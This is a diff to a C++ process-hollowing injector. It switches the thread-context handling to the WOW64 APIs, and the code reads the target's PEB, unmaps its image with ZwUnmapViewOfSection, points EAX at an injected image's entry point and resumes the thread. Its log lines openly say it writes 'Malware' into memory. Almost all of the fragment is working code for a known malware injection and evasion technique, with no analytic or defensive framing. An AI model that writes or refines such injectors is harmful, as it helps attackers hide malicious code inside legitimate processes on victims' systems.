@@ -86,12 +86,12 @@ int main() {
 	std::cout << "[+] Wrote Malware into memory at: 0x" << malwareImage << std::endl;
 
 
-	CONTEXT context = CONTEXT();
+	WOW64_CONTEXT context = WOW64_CONTEXT();
 	context.ContextFlags = CONTEXT_INTEGER;
 
 
 	//Using context structure pointer c to pull thread context for target process.
-	GetThreadContext(processInfo->hThread, &context);
+	Wow64GetThreadContext(processInfo->hThread, &context);
 
 	DWORD PEBAddr = context.Ebx;
 
@@ -102,13 +102,14 @@ int main() {
 		LPVOID(PEBAddr + 8),
 		&targetBaseAddress,
 		sizeof(PVOID),
-		0
+		NULL
 	);
 	std::cout << "[+] Target Base Address : 0x" << targetBaseAddress << std::endl;
 
 
 	//This declaration will be used to hollow the process
 	typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);
+
 
 
 	//Get handle of ntdll.dll and use to get address of ZwUnmapViewOfSection
@@ -189,13 +190,11 @@ int main() {
 	//ResumeThread() takes the created process out of the suspended state from createProcess().
 	context.Eax = (SIZE_T)((LPBYTE)hollow + NTHeaders->OptionalHeader.AddressOfEntryPoint);
 
-	SetThreadContext(processInfo->hThread, &context);
+	Wow64SetThreadContext(processInfo->hThread, &context);
 	ResumeThread(processInfo->hThread);
 
-	CloseHandle(processInfo->hProcess);
-	CloseHandle(processInfo->hThread);
 
-	
+	system("pause");
 
 	return 0;
 
